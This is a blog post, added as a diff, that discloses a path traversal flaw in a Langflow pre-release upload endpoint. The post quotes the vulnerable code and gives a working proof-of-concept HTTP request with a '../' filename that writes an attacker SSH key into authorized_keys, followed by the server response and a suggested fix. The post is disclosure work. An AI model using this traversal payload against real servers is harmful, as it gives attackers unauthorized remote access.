@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release | sunriseXu’s bug hunting journey</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Name" />
+<meta property="og:description" content="Name" />
+<link rel="canonical" href="http://localhost:4000/file-overwrite/2024/05/26/remote-code-executoin-using-path-traversal-in-langflow.html" />
+<meta property="og:url" content="http://localhost:4000/file-overwrite/2024/05/26/remote-code-executoin-using-path-traversal-in-langflow.html" />
+<meta property="og:site_name" content="sunriseXu’s bug hunting journey" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-05-26T10:31:06+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-05-26T10:31:06+08:00","datePublished":"2024-05-26T10:31:06+08:00","description":"Name","headline":"Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/file-overwrite/2024/05/26/remote-code-executoin-using-path-traversal-in-langflow.html"},"url":"http://localhost:4000/file-overwrite/2024/05/26/remote-code-executoin-using-path-traversal-in-langflow.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="sunriseXu&apos;s bug hunting journey" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">sunriseXu&#39;s bug hunting journey</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2024-05-26T10:31:06+08:00" itemprop="datePublished">May 26, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in Langflow Pre-release.</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="version">Version</h2>
+
+<blockquote>
+  <p>Pre-release version: 1.0 Alpha - v1.0.0a37</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>The post <code class="language-plaintext highlighter-rouge">/upload/{flow_id}</code> endpoint in the Langflow <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47">upload_file</a> is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">filename</code> parameter which allows the uploading of arbitrary files. The <code class="language-plaintext highlighter-rouge">filename</code> is then directly append to a directory path <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34">without sanitized</a> and the file content is writen to dest location. An attacker can upload and overwrite ANY file on the filesystem. This can lead to remote code execution in many different ways.</p>
+
+<p>The vulnerable function <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34"><code class="language-plaintext highlighter-rouge">save_file</code></a>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>async def save_file(self, flow_id: str, file_name: str, data: bytes):
+        folder_path = self.data_dir / flow_id
+        folder_path.mkdir(parents=True, exist_ok=True)
+        file_path = folder_path / file_name
+
+        try:
+            with open(file_path, "wb") as f:
+                f.write(data)
+            logger.info(f"File {file_name} saved successfully in flow {flow_id}.")
+        except Exception as e:
+            logger.error(f"Error saving file {file_name} in flow {flow_id}: {e}")
+            raise e
+</code></pre></div></div>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>In this proof of concept, we will be gaining remote code execution by uploading our SSH key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. There are many other ways to achieve remote code execution via a file upload, such as overwriting binaries, writing to .bashrc, ….</p>
+
+<p>We proof this vulnerability by logging into the <code class="language-plaintext highlighter-rouge">kali</code> user running the langflow python API and checking that at this moment the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file does not exist.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
+cat: /home/kali/.ssh/authorized_keys: No such file or directory
+</code></pre></div></div>
+
+<p>An attacker can now send the following request to the webserver. This request will upload the attacker’s public RSA key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p>
+
+<p>We start a simple server using tutorial from <a href="https://github.com/langflow-ai/langflow?tab=readme-ov-file#-installation">https://github.com/langflow-ai/langflow?tab=readme-ov-file#-installation</a>. Note that we use pre-release versoin:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Install the pre-release version
+python -m pip install langflow --pre --force-reinstall
+</code></pre></div></div>
+<p>Start web interface, the default port is <code class="language-plaintext highlighter-rouge">7860</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -m langflow run
+</code></pre></div></div>
+
+<p>Then open the Langflow web interface in browser, create a new project and in the project add a file component, click the file upload button, select random text file with burpsuite intercepting the upload request. We can see the file name and file content in the multipart request body.</p>
+
+<p><img src="/assets/images/bughunter/langflow/file-component.png" alt="file-component" /></p>
+
+<p><img src="/assets/images/bughunter/langflow/file-upload.png" alt="file-upload" /></p>
+
+<p>Change the multipart <code class="language-plaintext highlighter-rouge">filename</code> to <code class="language-plaintext highlighter-rouge">../../../../../../../../../home/kali/.ssh/authorized_keys</code> and file content to our <code class="language-plaintext highlighter-rouge">authorized_keys</code> content. Repeat the upload request.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:7860/api/v1/files/upload/7e774022-0991-47f7-83a1-ef127d439755 HTTP/1.1
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjODFiMWM1Yy1lYzgxLTRkZmQtOGFiZS0yMGIxNDBmOWY3NjkiLCJleHAiOjE3NDgyMjk3NDJ9.PrPNZGIOgBql3mDBTWqmdpg4G1zYeaB-087GH5NHvYE
+Cache-Control: no-cache
+Connection: close
+Cookie: access_token_lf=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjODFiMWM1Yy1lYzgxLTRkZmQtOGFiZS0yMGIxNDBmOWY3NjkiLCJleHAiOjE3NDgyMjk3NDJ9.PrPNZGIOgBql3mDBTWqmdpg4G1zYeaB-087GH5NHvYE
+Origin: http://127.0.0.1:7860
+Pragma: no-cache
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Host: 127.0.0.1:7860
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=--------------------------636165805457578805665550
+Content-Length: 647
+
+----------------------------636165805457578805665550
+Content-Disposition: form-data; name="file"; filename="../../../../../home/kali/.ssh/authorized_keys"
+Content-Type: application/octet-stream
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
+----------------------------636165805457578805665550--
+</code></pre></div></div>
+
+<p>The response indicates success with the uploaded file path.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 201 Created
+Connection: close
+Content-Length: 146
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Origin: http://127.0.0.1:7860
+Content-Type: application/json
+Date: Sun, 26 May 2024 03:48:37 GMT
+Server: uvicorn
+Vary: Origin
+
+{"flowId":"7e774022-0991-47f7-83a1-ef127d439755","file_path":"7e774022-0991-47f7-83a1-ef127d439755/../../../../../home/kali/.ssh/authorized_keys"}
+</code></pre></div></div>
+
+<p>We can verify the success by again checking the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
+</code></pre></div></div>
+
+<h2 id="fix">Fix</h2>
+
+<p>Use <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47">UUID instead of origin file name to store the file</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@router.post("/upload/{flow_id}", status_code=HTTPStatus.CREATED)
+async def upload_file(
+    file: UploadFile,
+    flow_id: UUID = Depends(get_flow_id),
+    storage_service: StorageService = Depends(get_storage_service),
+):
+    try:
+        flow_id_str = str(flow_id)
+        file_content = await file.read()
+        # fix the path travesal problem
+        file_name = hashlib.sha256(file_content).hexdigest()
+        folder = flow_id_str
+        await storage_service.save_file(flow_id=folder, file_name=file_name, data=file_content)
+        return UploadFileResponse(flowId=flow_id_str, file_path=f"{folder}/{file_name}")
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+</code></pre></div></div>
+
+<h2 id="impact">Impact</h2>
+
+<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
+
+<h3 id="ssh-access">SSH Access</h3>
+
+<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
+
+<h3 id="web-servers">Web Servers</h3>
+
+<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
+
+<h3 id="any-bounty">Any bounty</h3>
+
+<p>Can I ask for a bug bounty award or a CVE id for this bug? Thank you very much!</p>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e">https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e</a></p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47">https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47</a></p>
+
+<p><a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34">https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34</a></p>
+
+  </div><a class="u-url" href="/file-overwrite/2024/05/26/remote-code-executoin-using-path-traversal-in-langflow.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">sunriseXu&#39;s bug hunting journey</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">sunriseXu&#39;s bug hunting journey</li><li><a class="u-email" href="mailto:github@example.com">github@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>sunriseXu&#39;s bug hunting journey, sharing new findings of bug hunting.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
